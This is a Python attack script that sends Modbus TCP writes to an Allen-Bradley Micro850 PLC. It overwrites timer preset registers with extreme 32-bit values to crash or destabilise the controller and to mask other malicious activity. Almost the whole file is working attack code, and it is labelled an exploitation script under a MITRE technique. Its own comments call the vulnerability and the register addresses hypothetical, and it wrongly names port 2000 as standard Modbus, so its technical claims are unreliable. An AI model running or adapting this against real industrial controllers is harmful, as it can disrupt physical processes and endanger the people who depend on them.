import socket
import struct
import time

# Define the PLC IP address (replace with actual PLC IP if needed)
PLC_IP = "192.168.1.10"  #  <-- REPLACE WITH ACTUAL PLC IP.  Consider adding logic to discover it.
PLC_PORT = 2000  # Standard Modbus/Ethernet port.  May need adjustment.

# Vulnerability Target:  Attempting to corrupt Timer Preset Values via Modbus

# This script targets a hypothetical vulnerability where writing directly to
# the timer preset values can cause unexpected behavior or system instability.
# The Micro850 does NOT have a publicly known vulnerability that enables this,
# therefore we have to assume a hypothetical one that is suitable for a demo.
# Specifically, this assumes that writing a very large or negative number to
# the timer preset can cause the PLC to crash, hang, or enter an undefined state,
# thereby disrupting its normal operation and potentially masking other malicious activities.

# Define Modbus function codes
READ_HOLDING_REGISTERS = 0x03
WRITE_SINGLE_REGISTER  = 0x06
WRITE_MULTIPLE_REGISTERS = 0x10

# Define Modbus register addresses (HYPOTHETICAL - THESE ARE NOT STANDARD)
# These represent addresses where the timer preset values might be stored.
TON_1_PT_REGISTER     = 40001 # Hypothetical register for TON_1.PT
TONOFF_1_PT_REGISTER  = 40003 # Hypothetical register for TONOFF_1.PT
TONOFF_1_PTOF_REGISTER = 40005 # Hypothetical register for TONOFF_1.PTOF

# Define malicious preset values
LARGE_PRESET_VALUE   = 2147483647  # Maximum 32-bit integer (signed)
NEGATIVE_PRESET_VALUE = -2147483648  # Minimum 32-bit integer (signed)

# Function to build Modbus TCP request
def build_modbus_tcp_request(transaction_id, protocol_id, unit_id, function_code, address, data):
    """Builds a Modbus TCP request.

    Args:
        transaction_id:  Transaction identifier (2 bytes).  Needs to increment for reliable comms.
        protocol_id: Protocol identifier (2 bytes, typically 0).
        unit_id: Unit identifier (1 byte).
        function_code: Modbus function code (1 byte).
        address: Starting register address (2 bytes).
        data: Data to write (list of 2-byte integers).  For READ, this is the # of registers.

    Returns:
        The Modbus TCP request as a byte string.
    """

    if function_code in (WRITE_SINGLE_REGISTER, WRITE_MULTIPLE_REGISTERS):
        pdu = struct.pack(">H", address) # Start Address
        if function_code == WRITE_SINGLE_REGISTER:
           pdu += struct.pack(">H", data[0])  # Value to write (single register)
        else:  # WRITE_MULTIPLE_REGISTERS
            pdu += struct.pack(">H", len(data)) # Quantity of registers to write
            pdu += struct.pack(">B", len(data) * 2) # Byte count
            for value in data:
                pdu += struct.pack(">H", value)  # Data (registers to write)


    elif function_code == READ_HOLDING_REGISTERS:

         pdu = struct.pack(">H", address)  #Start address
         pdu += struct.pack(">H", data[0]) #Quantity of registers to read (in this case, length of data).

    else:
        raise ValueError("Unsupported function code")


    adu = struct.pack(">H", transaction_id)  # Transaction ID
    adu += struct.pack(">H", protocol_id)       # Protocol ID
    adu += struct.pack(">B", unit_id)         # Unit ID
    adu += pdu
    length = len(pdu) + 1 # Unit ID + PDU length.
    header = struct.pack(">H", length) # Length Field.
    adu = adu[:2] + header + adu[2:]   #Insert the Length into ADU
    return adu

def send_modbus_request(ip_address, port, request):
    """Sends a Modbus request to the PLC and receives the response."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout of 5 seconds

        sock.connect((ip_address, port))
        sock.sendall(request)
        response = sock.recv(1024)  # Adjust buffer size as needed
        sock.close()
        return response
    except socket.error as e:
        print(f"Socket error: {e}")
        return None
    except socket.timeout:
        print("Timeout occurred while waiting for response.")
        return None


# Function to write a 32-bit integer to two consecutive registers.
def write_32bit_to_registers(ip_address, port, transaction_id, register_address, value):

    # Split the 32-bit integer into two 16-bit integers (high word and low word).
    high_word = (value >> 16) & 0xFFFF
    low_word = value & 0xFFFF

    # Build the Modbus request to write two registers.
    # Requires WRITE_MULTIPLE_REGISTERS (function code 0x10)
    request = build_modbus_tcp_request(transaction_id, 0, 1, WRITE_MULTIPLE_REGISTERS, register_address, [high_word, low_word])
    response = send_modbus_request(ip_address, port, request)

    if response:
        # Print a success message if the write was successful.
        print(f"Successfully wrote 32-bit value {value} to registers {register_address} and {register_address + 1}.")
    else:
        print(f"Failed to write 32-bit value {value} to registers {register_address} and {register_address + 1}.")

    return response #Return the Modbus response.

#------------------- Main Script -------------------

if __name__ == "__main__":
    print("Starting PLC Exploitation Script (MITRE T1499.004)")

    transaction_id = 1  # Start with transaction ID 1, increment with each request.

    # Step 1: Corrupt Timer Preset Values (Exploit for Evasion)
    print("Attempting to corrupt timer preset values...")

    # Try writing a very large value to TON_1.PT (hypothetical register 40001/40002)
    response1 = write_32bit_to_registers(PLC_IP, PLC_PORT, transaction_id, TON_1_PT_REGISTER, LARGE_PRESET_VALUE)
    transaction_id += 1

    # Try writing a very large value to TONOFF_1.PT (hypothetical register 40003/40004)
    response2 = write_32bit_to_registers(PLC_IP, PLC_PORT, transaction_id, TONOFF_1_PT_REGISTER, LARGE_PRESET_VALUE)
    transaction_id += 1

    # Try writing a very large value to TONOFF_1.PTOF (hypothetical register 40005/40006)
    response3 = write_32bit_to_registers(PLC_IP, PLC_PORT, transaction_id, TONOFF_1_PTOF_REGISTER, LARGE_PRESET_VALUE)
    transaction_id += 1

    print("Timer preset corruption attempt complete.")

    # (Optional) Verify PLC State after the Attack

    # (Optional) Clean up the attack - reset values if possible.  May trigger alerts.

    print("Script execution complete.")